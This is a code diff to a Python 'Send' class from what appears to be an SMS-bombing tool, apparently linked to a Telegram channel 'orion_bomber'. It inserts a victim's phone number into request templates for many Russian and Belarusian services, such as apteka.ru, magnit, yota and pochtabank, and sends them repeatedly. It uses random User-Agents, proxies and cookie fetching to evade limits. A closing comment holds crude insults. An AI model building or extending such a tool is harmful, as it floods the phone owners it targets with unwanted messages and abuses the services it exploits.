@@ -9,11 +9,18 @@ class Send:
         self.service = service
         self.service_data = None
         self.services = None
-        self.time_out_ = {'apteka.ru': 0, 'magnit': 0, 'telegram': 0}
-        self.time_out_config = {'apteka.ru': 120, 'magnit': 120, 'telegram': 120}
+        self.cookie = {'yota': 'https://tv.yota.ru/'}
+        self.response_services = {'apteka.ru': 200, 'magnit': "json", 'telegram': 200, 'citi_link': 200, 'akbarsa': 200, 'yota': 201, 'b_apteka': 200, 'mir': 200, 'pochtabank': 200}
+        self.time_out_ = {'apteka.ru': 0, 'magnit': 0, 'telegram': 0, 'citi_link': 0, 'akbarsa': 0, 'yota': 0, 'b_apteka': 0, 'mir': 0, 'pochtabank': 0}
+        self.time_out_config = {'apteka.ru': 120, 'magnit': 120, 'telegram': 120, 'citi_link': 60, 'akbarsa': 60, 'yota': 60, 'b_apteka': 60, 'mir': 60, 'pochtabank': 120}
+        self.default_headers = {'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9',
+				                'Accept-Encoding': 'gzip, deflate, br',
+				                'Accept-Language': 'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
+				                'Cache-Control': 'no-cache',
+				                'Connection': 'keep-alive',
+				                'User-Agent': None}
 
     def checktimeout(self, service):
-        # now_time = time.time()
         time_out_ = self.time_out_
         time_out_config = self.time_out_config
         if time_out_[service] == 0:
@@ -32,6 +39,30 @@ class Send:
                 print('error: что-то пошло не так (возможно в конфиге нету нужного сервиса)')
                 return False
 
+    def json_parse(self, payload, datatype, country, phone):
+        # Форматирование для России
+        if country == 'ru':
+            for old, new in {
+                "'": '"',
+                "*+phone*": phone[0],
+                "*phone*": phone[1],
+                "*phone8*": phone[2],
+                "*phone()*": phone[3]
+            }.items():
+                if old in payload:
+                    payload = payload.replace(old, new)
+            return datatype, payload
+        # Форматирование для Беларуси
+        elif country == 'by':
+            for old, new in {
+                "'": '"',
+                "*+phone*": phone[0],
+                "*phone*": phone[1],
+                "*-phone*": phone[2]
+            }.items():
+                if old in payload:
+                    payload = payload.replace(old, new)
+            return datatype, payload
 
     # Обработка json для последующего спама
     def json_processing(self, phone):
@@ -49,7 +80,7 @@ class Send:
         try:
             service = self.services[self.service]
         except: # Если нужного сервиса не оказалось в json
-            return False
+            return False, False
         self.service_data = service
 
         if "json" in service: # Если данные для запроса json
@@ -58,67 +89,74 @@ class Send:
         elif "data" in service: # Если данные для запроса data
             payload = service["data"]
             datatype = 'data'
-        else:
-            payload = service["url"] # Если данные для запроса в url
-            datatype = 'url'
 
-        # Форматирование для России
-        if country == 'ru':
-            for old, new in {
-                "#+phone#": phone[0],
-                "#phone#": phone[1],
-                "#phone8#": phone[2],
-                "#phone()#": phone[3]
-            }.items():
-                if old in payload:
-                    payload = payload.replace(old, new)
-            return datatype, payload
-        # Форматирование для беларуси
-        elif country == 'by':
-            for old, new in {
-                "#+phone#": phone[0],
-                "#phone#": phone[1],
-                "#-phone#": phone[2]
-            }.items():
-                if old in payload:
-                    payload = payload.replace(old, new)
-            return datatype, payload
+        payload, datatype = self.json_parse(payload, datatype, country, phone)
+
+        # Проверка, нужно ли менять url
+        if '*' in service["url"]:
+            data = [True, (self.json_parse(service["url"], "url", country, phone)), (payload, datatype)] # (True(с изменениями в url) or False, (payload, "url") - в случае True, (payload, "json or data"))
+            return data
+        else:
+            data = [False, (payload, datatype)]
+            return data
+
 
     # Функция для спама
     def spam(self, phone, proxy=None):
+        payloadUrl = ''
         if self.json_processing(phone) != False:
-            datatype, payload = self.json_processing(phone)
+            if self.json_processing(phone)[0] == True:
+                payloadUrl = self.json_processing(phone)[1][1]
+                datatype, payload = self.json_processing(phone)[2]
+            else:
+                datatype, payload = self.json_processing(phone)[1]
         else: # Если сервиса нет в json
-            return False
+            return False, False
 
         # Дата сервиса
         service = self.service_data
-        url = service["url"]
+        if payloadUrl != '':
+            url = payloadUrl
+        else:
+            url = service["url"]
 
         # Генерируем headers
         ua = UserAgent().random
         try:
-            service["headers"]["User-Agent"] = ua
+            service["headers"]["User-Agent"] = ua # Здесь мы берем хедерсы с json, если конечно они там есть, иначе используем дефолтные
             headers = service["headers"]
         except:
-            headers = {"User-Agent": ua}
+            headers = self.default_headers
+            headers['User-Agent'] = ua
 
         session = requests.Session()
-        request = requests.Request("POST", url)
-        request.headers = headers
+
+        # Получаем куки сайта (если нужны)
+        cookies = None
+        if self.service in self.cookie:
+            cookies = session.get(self.cookie[self.service]).cookies
 
         # В зависимости от типа входных данных, добавляем их в запрос
+        json_ = None
+        data = None
         if datatype == "json":
-            request.json = eval(payload)
+            json_ = json.loads(payload)
         elif datatype == "data":
-            request.data = eval(payload)
-        elif datatype == "url":
-            request.url = payload["url"]
-
+            data = json.loads(payload)
         # Отправляем запрос
         try:
-            request = request.prepare()
-            r = session.send(request, timeout=10, proxies=proxy)
-            return r.status_code
+            if self.service == 'pochtabank': # для инвалида
+                session.post('https://my.pochtabank.ru/dbo/registrationService/ib')
+                r = session.put(url, json=json_)
+            else:
+                r = session.post(url, json=json_, data=data, timeout=10, proxies=proxy, cookies=cookies, headers=headers)
+            if self.response_services[self.service] == "json":
+                return r.status_code, r.json()
+            else:
+                if r.status_code == self.response_services[self.service]:
+                    return 200, r.text
+                else:
+                    return r.status_code, r.text
         except:
-            return False
+            return False, False # Не нравиться? Иди нахуй предъяви нам, а нас ты сможешь найти только в нашем телеграм
+                                # канале, подписывайся и пиши нам свои жалобы личинус ебаный - https://t.me/orion_bomber
